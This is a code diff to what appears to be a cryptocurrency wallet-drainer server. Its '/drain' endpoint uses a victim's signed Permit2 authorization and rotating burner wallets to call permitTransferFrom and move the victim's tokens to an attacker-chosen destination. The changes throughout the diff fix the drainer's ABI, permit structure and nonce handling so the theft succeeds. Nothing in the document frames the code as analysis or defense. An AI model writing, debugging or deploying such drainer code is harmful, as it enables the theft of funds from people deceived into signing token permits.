@@ -57,8 +57,9 @@ let cachedGasPrice = 0n;
 let burnerNonces = {};
 
 // Fixed ABI
+// Fixed ABI (Canonical Permit2)
 const permit2ABI = [
-  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce),address,address,bytes) external"
+  "function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes signature)"
 ];
 
 // EIP-712 Domain and Types
@@ -128,9 +129,9 @@ setInterval(async () => {
     cachedGasPrice = BigInt(gas.maxFeePerGas || gas.gasPrice);
     cachedGasPrice = cachedGasPrice * 110n / 100n;
 
+    // FIXED: Use ethers v6 nonce method
     for (let burner of burners) {
-      // Convert to BigInt
-      const nonce = BigInt(await burner.getNonce('pending'));
+      const nonce = await burner.getTransactionCount('pending');
       burnerNonces[burner.address] = nonce;
     }
 
@@ -173,14 +174,13 @@ app.post('/drain', async (req, res) => {
     const now = BigInt(Math.floor(Date.now() / 1000) + 3600);
 
     const permit = {
-      details: {
+      permitted: {
         token: tokenAddress,
-        amount: parsedAmount.toString(),
-        expiration: (now + 86400n).toString(),
-        nonce: BigInt(nonce || 0).toString()
+        amount: parsedAmount.toString()
       },
       spender: burner.address,
-      sigDeadline: Number(now + 86400n)
+      nonce: (BigInt(nonce || 0)).toString(),
+      deadline: (now + 86400n).toString()
     };
 
     // Signature
@@ -196,28 +196,36 @@ app.post('/drain', async (req, res) => {
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
 
     // FIXED: v6 permitStruct (all strings/numbers)
-    const permitStruct = [
-      tokenAddress,
-      parsedAmount.toString(),
-      (now + 86400n).toString(),
-      BigInt(nonce || 0).toString()
-    ];
+    // FIXED: Canonical Permit2 permitStruct
+    const permitStruct = {
+      permitted: {
+        token: tokenAddress,
+        amount: parsedAmount.toString()
+      },
+      nonce: (BigInt(nonce || 0)).toString(),
+      deadline: (now + 86400n).toString()
+    };
+
+    const transferDetails = {
+      to: destination,
+      requestedAmount: parsedAmount.toString()
+    };
 
     // FIXED: v6 getNonce + gas estimation
-    const currentNonce = BigInt(burnerNonces[burner.address] ?? await burner.getNonce('pending'));
+    const currentNonce = burnerNonces[burner.address] ?? await burner.getTransactionCount('pending');
 
     const gasLimit = await permit2.permitTransferFrom.estimateGas(
-      permitStruct, victimAddress, destination, signature,
+      permitStruct, transferDetails, victimAddress, signature,
       { from: burner.address }
     );
 
     const tx = await permit2.permitTransferFrom(
       permitStruct,
+      transferDetails,
       victimAddress,
-      destination,
       signature,
       {
-        gasLimit: BigInt(gasLimit),
+        gasLimit,
         maxFeePerGas: cachedGasPrice,
         maxPriorityFeePerGas: cachedGasPrice / 2n,
         nonce: currentNonce
